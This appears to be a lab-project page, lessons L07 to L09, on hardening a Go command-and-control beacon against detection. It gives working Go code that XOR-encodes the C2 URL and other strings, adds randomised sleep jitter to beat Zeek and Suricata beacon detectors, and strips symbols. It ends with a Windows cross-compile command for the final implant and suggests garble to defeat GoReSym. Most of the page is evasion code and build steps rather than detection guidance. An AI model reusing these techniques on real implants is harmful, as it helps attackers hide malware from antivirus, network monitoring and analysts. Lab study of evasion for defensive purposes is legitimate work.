Making the payload harder to detect

Three techniques applied to the v3 payload. Each one addresses a specific detection vector identified in the blue team analysis. The payload behaviour is unchanged — only what analysts can observe about it changes.

L07

XOR string obfuscation

v4_xor.go — all hardcoded strings removed from plaintext — T1027.002

Complete

Version 3 has every sensitive string visible in the compiled binary. Run strings.exe net_scan_v3.exe and you immediately see the C2 URL, the registry path, and every command the payload runs. Any AV signature or analyst searching for 192.168.1.10:5000 finds it instantly.

XOR encoding removes these strings from the binary. Each sensitive string is pre-encoded as a byte array. At runtime the decode() function recovers the original string by XOR-ing each byte again with the same key. The plaintext string is never stored in the binary on disk.

The decode function

v4_xor.goGo
const xorKey byte = 0x5A   // XOR key — same value encodes and decodes

func decode(b []byte) string {
    out := make([]byte, len(b))
    for i, v := range b { out[i] = v ^ xorKey }
    return string(out)
}

Pre-encoded string example — the C2 URL

The original URL (http://192.168.1.10:5000/beacon) does not appear anywhere in the source. Only the encoded bytes do:

v4_xor.goGo
// http://192.168.1.10:5000/beacon — encoded with key 0x5A
var encC2URL = []byte{
    0x32, 0x2e, 0x2e, 0x2a, 0x60, 0x75, 0x75, 0x6b, 0x63, 0x68,
    0x74, 0x6b, 0x6c, 0x62, 0x74, 0x6b, 0x74, 0x6b, 0x6a, 0x60,
    0x6f, 0x6a, 0x6a, 0x6a, 0x75, 0x38, 0x3f, 0x3b, 0x39, 0x35, 0x34,
}

// Decoded only at runtime, immediately before use
c2URL := decode(encC2URL)
Critical point. Writing decode("http://192.168.1.10:5000/beacon") does NOT work. The string literal still appears in the binary even though you decode it. The bytes must be pre-computed and written as integer arrays — no string literals for any sensitive value.

L08

Sleep jitter

v5_jitter.go — randomised beacon interval — T1497

Complete

Version 4 hides the strings but the network behaviour is still predictable. The payload beacons at exactly 60-second intervals. Network IDS tools like Zeek and Suricata have dedicated beacon detection modules that look for exactly this pattern: a fixed inter-arrival time from the same source to the same destination. The timing alone is a signature — they do not need to read the packet contents.

Jitter adds a random offset to each sleep so no two intervals are identical. The base is still 60 seconds but each cycle sleeps anywhere between 48 and 72 seconds. To a beacon detector the traffic no longer has a stable periodicity.

The jitteredSleep function

v5_jitter.goGo
func jitteredSleep(base time.Duration, pct int) {
    // Maximum deviation: 20% of 60s = 12s
    delta := int64(base) * int64(pct) / 100

    // Random offset in range: -12s to +12s
    offset := rand.Int63n(delta*2) - delta

    time.Sleep(base + time.Duration(offset))
}

// Usage: sleeps 48s – 72s, different every cycle
jitteredSleep(60*time.Second, 20)

The only code change from v4

diff: v4 → v5diff
// import block: add "math/rand"

// Bottom of beacon loop:
- time.Sleep(60 * time.Second)
+ jitteredSleep(60*time.Second, 20)
Verify jitter in Wireshark. Run v4 for 3 minutes then v5 for 3 minutes with the filter http.request.method == "POST". The Time column shows constant 60s intervals for v4 and varying intervals for v5. Screenshot both — this is the core before/after for this lesson.

L09

Binary stripping

v5_jitter.go compiled with -ldflags="-s -w" — T1027

Complete

A Go binary compiled without flags embeds the symbol table (all function names and variable names) and DWARF debugging tables (source file paths, line numbers). Load an unstripped binary in Ghidra and you can read every function name: main.main, main.sendToC2, main.decode. The strip flags remove all of this without changing any runtime behaviour.

Build commands

PowerShellshell
# Standard build — function names visible in Ghidra (~1.8MB)
go build -o v5_jitter.exe v5_jitter.go

# Stripped build — no function names, no source paths (~1.2MB)
go build -ldflags="-s -w" -o v5_final.exe v5_jitter.go

# Verify: should show nothing for either search
strings.exe v5_final.exe | findstr "http"
strings.exe v5_final.exe | findstr "netstat"

What each flag removes

FlagRemovesEffect on runtime
-sSymbol table — all function names, variable names, package pathsNone
-wDWARF debugging info — source file paths, line numbers, type infoNone
-s -wBoth. Maximum size reduction and analyst visibility reductionNone
What still remains. The Go runtime is still in the binary — tools like Detect-It-Easy still identify it as a Go binary. A tool called GoReSym (Mandiant) can recover Go function names from stripped binaries using the module data structure the runtime requires. Binary stripping slows down analysis; it does not prevent it. The advanced extension is garble — a build-time obfuscator that defeats GoReSym as well.

Final build — all three techniques combined

v5_jitter.go compiled with the strip flags is the most complete version produced in this project. It applies all three obfuscation layers: XOR string encoding (no plaintext strings), sleep jitter (no fixed beacon interval), and binary stripping (no function names in Ghidra).

Final build commandshell
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o v5_final.exe v5_jitter.go
